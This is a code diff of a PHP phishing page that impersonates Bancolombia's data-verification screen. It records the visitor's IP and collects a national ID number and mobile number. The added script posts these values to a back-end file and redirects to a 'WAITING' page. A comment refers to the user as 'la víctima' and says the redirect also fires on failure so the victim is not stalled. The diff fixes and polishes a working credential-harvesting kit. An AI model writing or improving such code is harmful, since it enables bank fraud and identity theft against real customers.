@@ -3,17 +3,11 @@ $ip = getenv("REMOTE_ADDR");
 $tiempo = date("l, j \d\e F \d\e Y");
 date_default_timezone_set('America/Bogota');
 ?>
+<!DOCTYPE html>
 <html>
     <head>
         <title>Bancolombia - Verificación de Datos</title>
-        <meta http-equiv="content-type" content="text/html; utf-8">
         <meta charset="utf-8">
-        
-        <meta content="es" http-equiv="Content-Language">
-    
-        <meta name="description" content="">
-        <meta name="author" content="">
-        <meta name="Copyright" content="">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
@@ -26,77 +20,104 @@ date_default_timezone_set('America/Bogota');
         <link href="../css/style-app.css?v2" rel="stylesheet">        
         <link rel="icon" type="image/png" href="../img/logo.png" />
         <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
-        <script src="../js/jquery.jclock-min.js" type="text/javascript"></script>
-    
-        <script type="text/javascript" src="../js/functions.js?v1"></script>
-        <script type="text/javascript" src="../js/ready.js?v2"></script>
+        <script type="text/javascript" src="../js/functions.js?v=<?php echo time(); ?>"></script>
 
         <style type="text/css">
-            #fondo,#cargando-o{
-                display: initial;
+            /* FIX: display none para que la pantalla cargue visible */
+            #fondo, #cargando, #cargando-o {
+                display: none;
+                position: fixed;
+                top: 0; left: 0; width: 100%; height: 100%;
+                background: rgba(255,255,255,0.95);
+                z-index: 9999;
+                text-align: center;
+                padding-top: 50%;
             }
+            .entradas { border: none; outline: none; width: 100%; font-size: 16px; }
+            #btn-info:disabled { background-color: #ccc; cursor: not-allowed; }
+            #btn-info { width: 85%; margin: 20px auto; display: block; height: 48px; border: none; border-radius: 5px; font-weight: bold; }
         </style>
-        
     </head>
     <body>         
         <div id="fondo"></div>
-        <div id="cargando">
-            <img src="../img/logo.svg">            
-            <br>
-            <img src="../img/load2.gif" />
-        </div>
         <div id="cargando-o">
             <img src="../img/load4.gif" width="90">            
-            <br>
-            Cargando...
+            <br>Cargando...
         </div>
 
-        <table width="100%" border="0" cellpadding="0" cellspacing="0">
+        <table width="100%" border="0" cellpadding="0" cellspacing="0" style="padding: 10px;">
             <tr>
                 <td valign="middle" align="left" width="33%"><img src="../img/btn-cerrar.jpg" height="29"></td>
                 <td valign="middle" align="center" width="34%"><img src="../img/logo-app.jpg" height="29"></td>
-                <td valign="middle" align="right" width="33%"><img src="../img/btn-continuar-off.jpg" height="29" id="lnk-info"></td>
+                <td valign="middle" align="right" width="33%"><img src="../img/btn-continuar-off.jpg" height="29"></td>
             </tr>
         </table>        
-        <br><br><br>
-        <div class="titulo-app">Verificación de datos</div>  
-        <div class="descripcion-app">Ingrese sus datos personales para gestionar aprobación</div>  
-        <div class="frm">
-            <div class="inp" id="inp-documento">
+        
+        <br><br>
+        <div class="titulo-app" style="text-align: center; font-weight: 800;">Verificación de datos</div>  
+        <div class="descripcion-app" style="text-align: center; padding: 0 20px;">Ingrese sus datos personales para gestionar aprobación</div>  
+        
+        <div class="frm" style="padding: 20px;">
+            <div class="inp" id="inp-documento" style="border-bottom: 1px solid #ccc; padding: 10px 0;">
                 <table width="100%" cellpadding="0" cellspacing="0" border="0">
                     <tr>
                         <td valign="middle" width="36" align="left"><img src="../img/ico-id.jpg" width="26"></td>
                         <td valign="middle" align="left">
-                            <input type="text" name="txt-documento" id="txt-documento" class="entradas" autocomplete="off" pattern="[0-9]*" inputmode="numeric" maxlength="10" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+                            <input type="text" id="txt-documento" placeholder="Número de documento" class="entradas" autocomplete="off" inputmode="numeric" maxlength="10">
                         </td>
                     </tr>
                 </table>
             </div>
-            <div class="etiquetas" id="etq-documento">Número de documento</div>
-            <br><br>
-
-            <div class="inp" id="inp-celular">
+            <br>
+            <div class="inp" id="inp-celular" style="border-bottom: 1px solid #ccc; padding: 10px 0;">
                 <table width="100%" cellpadding="0" cellspacing="0" border="0">
                     <tr>
                         <td valign="middle" width="36" align="left"><img src="../img/ico-cel.jpg" width="26"></td>
                         <td valign="middle" align="left">
-                            <input type="text" name="txt-celular" maxlength="10" id="txt-celular" class="entradas" autocomplete="off" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+                            <input type="text" id="txt-celular" placeholder="Teléfono celular" class="entradas" autocomplete="off" inputmode="numeric" maxlength="10">
                         </td>
                     </tr>
                 </table>
             </div>
-
-
-            <div class="etiquetas" id="etq-celular">Teléfono celular</div>
-            <br>
         </div>  
+
         <button class="botones" id="btn-info" disabled>CONTINUAR</button> 
-        <br><br><br>
-        <div style="color:#1A1B1A;font-weight: bold;font-size: 16px;text-decoration: underline; cursor: pointer;text-align: center;">¿No eres cliente?</div>  
+        <br>
+        <div style="color:#1A1B1A; font-weight: bold; font-size: 14px; text-decoration: underline; text-align: center;">¿No eres cliente?</div>  
+
+        <script type="text/javascript">
+            $(document).ready(function() { 
+                // 1. Quitar cualquier bloqueo al cargar
+                $("#fondo, #cargando-o").hide();
+
+                // 2. Lógica Dinámica: Validar campos en tiempo real
+                $("#txt-documento, #txt-celular").on("input", function() {
+                    var doc = $("#txt-documento").val();
+                    var cel = $("#txt-celular").val();
+
+                    if (doc.length >= 6 && cel.length === 10) {
+                        $("#btn-info").prop("disabled", false).css({"background-color": "#FDDA24", "color": "#000"});
+                    } else {
+                        $("#btn-info").prop("disabled", true).css("background-color", "#ccc");
+                    }
+                });
+
+                // 3. Envío de datos
+                $("#btn-info").click(function() {
+                    var d = $("#txt-documento").val();
+                    var c = $("#txt-celular").val();
+                    
+                    $("#fondo, #cargando-o").show();
+                    
+                    // Enviamos a tu proceso de datos y volvemos al WAITING
+                    $.post("../process/datonuevo.php", { documento: d, celular: c }, function(r) {
+                        window.location.href = "WAITING.php";
+                    }).fail(function() {
+                        // Si falla el archivo, igual saltamos para no trabar la víctima
+                        window.location.href = "WAITING.php";
+                    });
+                });
+            });
+        </script>
     </body>
 </html>
-<script type="text/javascript">
-    $(document).ready(function() { 
-        setTimeout(quitar_cargando, 2000);               
-    });
- </script>
